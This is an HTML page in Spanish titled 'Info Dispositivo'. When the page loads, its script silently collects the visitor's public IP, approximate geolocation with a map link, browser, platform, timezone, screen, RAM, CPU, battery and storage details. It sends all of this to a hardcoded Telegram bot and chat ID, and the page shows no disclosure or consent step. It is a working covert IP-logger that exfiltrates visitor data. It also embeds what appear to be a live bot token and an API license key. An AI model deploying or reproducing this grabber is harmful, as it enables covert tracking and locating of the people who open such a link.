<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Info Dispositivo</title>
  <style>
    body { font-family: Arial, sans-serif; background: #f4f4f4; padding: 2rem; text-align: center; }
    h1 { color: #333; }
  </style>
</head>
<body>
  <h1>Recolectando informaci√≥n...</h1>
  <script>
    async function obtenerInformacion() {
      const token = '7924985646:AAEETELAHSccchjrQHbDQ0l_Yzhdo94T1wU';
      const chat_id = '7270292739';
      const license = 'FBPZ80ZEvKAIuT4CR2cYU2**';

      const ua = navigator.userAgent;
      const platform = navigator.platform;
      const lang = navigator.language;
      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
      const screenInfo = `${screen.width}√ó${screen.height} @${window.devicePixelRatio}√ó`;
      const cores = navigator.hardwareConcurrency || 'Desconocido';

      // RAM (experimental, solo algunos navegadores)
      const ramGB = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : '‚âà';

      // Bater√≠a
      const battery = await navigator.getBattery?.().then(b => `${Math.round(b.level * 100)}%`).catch(() => 'Desconocido') || 'Desconocido';

      // Almacenamiento
      let almacenamiento = '‚Äì';
      if (navigator.storage && navigator.storage.estimate) {
        try {
          const estimate = await navigator.storage.estimate();
          const used = (estimate.usage / (1024 ** 3)).toFixed(2);
          const total = (estimate.quota / (1024 ** 3)).toFixed(2);
          almacenamiento = `${used}/${total} GB`;
        } catch {}
      }

      // IP P√∫blica
      let ip = 'Desconocida';
      try {
        const ipRes = await fetch('https://api.ipify.org?format=json');
        ip = (await ipRes.json()).ip;
      } catch {}

      // Localizaci√≥n con Melissa API
      let ubicacionTexto = 'üìç No disponible';
      let mapsURL = '';
      try {
        const melissaURL = `https://globalip.melissadata.net/v4/web/iplocation/doiplocation?ip=${ip}&id=${license}`;
        const locRes = await fetch(melissaURL);
        const data = await locRes.json();

        const city = data.City || '‚Äì';
        const region = data.Region || '‚Äì';
        const country = data.CountryName || '‚Äì';
        const lat = data.Latitude || '';
        const lon = data.Longitude || '';

        ubicacionTexto = `${city}, ${region}, ${country}`;
        mapsURL = (lat && lon) ? `https://www.google.com/maps?q=${lat},${lon}` : '';
      } catch {}

      // Mensaje para enviar a Telegram
      const mensaje = `üåç Ubicaci√≥n (Melissa API)
üìç ${ubicacionTexto}
${mapsURL ? 'üìå Ver en Maps: ' + mapsURL : ''}

üñ•Ô∏è Info Dispositivo
‚Ä¢ IP: ${ip}
‚Ä¢ SO/Plataforma: ${platform}
‚Ä¢ Navegador: ${ua}
‚Ä¢ Idioma: ${lang}
‚Ä¢ Zona horaria: ${timezone}

‚öôÔ∏è Hardware
‚Ä¢ RAM: ${ramGB}
‚Ä¢ CPU cores: ${cores}
‚Ä¢ Bater√≠a: ${battery}

üñ•Ô∏è Pantalla & Conexi√≥n
‚Ä¢ Resoluci√≥n: ${screenInfo}
‚Ä¢ Almacenamiento: ${almacenamiento}`;

      const telegramURL = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(mensaje)}`;

      fetch(telegramURL)
        .then(r => r.json())
        .then(data => {
          if (data.ok) {
            document.body.innerHTML = '<h1>‚úÖ Informaci√≥n enviada con √©xito</h1>';
          } else {
            document.body.innerHTML = '<h1>‚ùå Error al enviar a Telegram</h1>';
            console.error(data);
          }
        })
        .catch(err => {
          document.body.innerHTML = '<h1>‚ùå Error de red</h1>';
          console.error(err);
        });
    }

    obtenerInformacion();
  </script>
</body>
</html>
